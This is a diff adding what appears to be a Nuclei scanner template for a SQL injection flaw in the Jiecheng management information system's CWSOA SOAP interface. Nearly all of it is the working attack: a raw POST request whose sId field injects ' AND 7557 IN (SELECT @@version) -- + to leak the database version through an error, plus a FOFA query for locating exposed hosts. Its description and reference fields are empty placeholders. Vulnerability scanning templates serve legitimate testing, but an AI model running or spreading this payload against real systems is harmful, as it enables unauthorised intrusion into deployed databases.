@@ -1,0 +1,45 @@
+id: jiecheng-CWSOA-sqli
+
+info:
+  name: 捷诚管理信息系统-CWSOA接口-SQL注入漏洞
+  author: candada
+  severity: high
+  description: description
+  reference:
+    - https://
+  metadata: 
+    fofa-query: body="/Scripts/EnjoyMsg.js"
+  tags: sql
+
+http:
+  - raw:
+      - |-
+        POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: text/xml;charset=UTF-8
+        SOAPAction: http://tempuri.org/GetOAById
+        Content-Length: 314
+
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+           <soap:Header/>
+           <soap:Body>
+              <tem:GetOAById>
+                 <!--type: string-->
+                 <tem:sId> gero et' AND 7557 IN (SELECT @@version) -- +</tem:sId>
+              </tem:GetOAById>
+           </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: binary
+        part: body
+        binary:
+          - '86206e76617263686172'
+      - type: status
+        status:
+          - 500
